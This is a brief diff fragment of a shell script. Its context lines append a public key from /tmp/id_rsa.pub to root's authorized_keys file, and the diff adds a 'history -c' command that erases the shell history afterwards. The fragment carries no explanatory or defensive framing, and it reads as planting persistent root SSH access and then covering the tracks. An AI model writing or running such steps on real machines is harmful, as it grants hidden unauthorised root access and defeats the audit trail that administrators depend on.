@@ -15,3 +15,4 @@ cat /tmp/id_rsa.pub
 
 [ -f /tmp/id_rsa.pub ] && cat /tmp/id_rsa.pub >> /root/.ssh/authorized_keys || echo "no key publica og"
  
+ history -c
